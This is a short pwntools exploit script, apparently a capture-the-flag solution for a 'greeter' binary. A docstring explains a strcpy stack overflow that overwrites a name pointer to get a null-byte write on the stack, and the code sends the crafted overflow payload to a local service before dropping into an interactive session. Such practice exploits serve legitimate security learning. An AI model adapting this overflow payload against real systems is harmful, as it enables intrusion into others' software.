from pwn import *

"""
When using the goodbye greeting, the strcpy leads to a stack overflow which
allows us to overwrite the greet.name pointer which then gets used to increment
tmp which has a null byte written to. By overwriting greet.name to a string of
a certain length, we get a null byte write for some position on the stack
relative to greet_string_buf. We need an offset of 57 so we use the
conveniently long lorem string.
"""

context.log_level = 'debug'
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda r, s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

exe = ELF("../publish/greeter")

# conn = process([exe.path])
conn = remote('127.0.0.1', 31451)

sla(b'Greet type: ', b'1')
sa(b'Name: ', (0x30 - 3) * b'x' + b'\x38\x20\x40')

conn.interactive()
